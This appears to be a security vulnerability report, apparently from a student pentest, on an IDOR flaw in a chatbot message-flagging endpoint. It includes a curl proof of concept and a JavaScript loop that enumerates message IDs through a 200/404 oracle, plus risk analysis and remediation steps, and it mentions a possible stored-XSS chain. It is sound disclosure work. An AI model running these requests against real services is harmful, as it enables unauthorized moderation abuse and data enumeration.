# Description

IDOR (CWE-639) on `POST /chatbot/api/flag/`. The endpoint lets any authenticated user "flag" (report for moderation) any chatbot message by `message_id`, without verifying that the target message belongs to the requester. A low-privilege account can flag arbitrary messages — including seed and admin-generated ones.

The `200` (exists) vs `404` (not found) response difference also creates an **existence oracle**, allowing unauthorized enumeration of valid message IDs.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Sign up and authenticate as a normal user. | Valid session + CSRF token. |
| 2 | Send one chatbot message to get a baseline `message_id`. | e.g. own id `20`. |
| 3 | POST `/chatbot/api/flag/` with `message_id` values you do **not** own. | `200 success` on others' messages. |

# PoC

**Minimal reproduction** (cookies = a current authenticated low-priv session):

```bash
curl -X POST 'http://<TARGET>/chatbot/api/flag/' \
  -H 'Content-Type: application/json' \
  -H 'X-CSRFToken: <csrf_token_from_cookie>' \
  -b 'sessionid=<your_session>; csrftoken=<csrf_token>' \
  -d '{"message_id": 11, "reason": "other", "description": ""}'
# HTTP 200 {"status":"success","message":"Response has been flagged for review. Thank you for your feedback."}
```

Message id `11` belongs to another user, yet the flag succeeds.

![Authenticated flag request on a non-owned message](Capture_d_cran_2026-05-23_153257.png)

**Bulk enumeration via the 200/404 oracle** maps the live message-id set:

```javascript
for (const id of [...Array(30).keys()].map(i=>i+1)) {
  const r = await fetch('/chatbot/api/flag/', {method:'POST',
    headers:{'Content-Type':'application/json','X-CSRFToken':csrf},
    body:JSON.stringify({message_id:id, reason:'other', description:''})});
  console.log(id, r.status);
}
// 200 → exists (flaggable), 404 → non-existent
```

![Flag attempts against ids the attacker does not own](Capture_d_cran_2026-05-23_161453.png)

![console.table of 200/404 results — existence oracle](Capture_d_cran_2026-05-23_161607.png)

![Single non-owned flag request/response detail](Capture_d_cran_2026-05-23_161822.png)

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Existence oracle enumerates the moderation history (valid message ids) without authorization. |
| Integrity | Pollution of the moderation queue; mass-flagging of legitimate/system messages degrades the moderation signal. |
| Availability | Moderators forced to triage attacker-generated noise. |

Secondary chain: the free-text `description` field is stored server-side — if rendered to moderators without escaping, it becomes a stored-XSS vector against privileged sessions. Overall severity: **Medium**.

# Remediation

1. **Server-side ownership check** — only allow flagging messages where `message.user == request.user`, else `404`.
2. If "any user may flag any message" is intentional, **return a constant response** regardless of id validity to suppress the oracle, and dedupe flags per user.
3. **HTML-escape `description`** in every administrative rendering path.
4. **Audit all object-level endpoints** for missing ownership checks.

# Author
CPE LYON
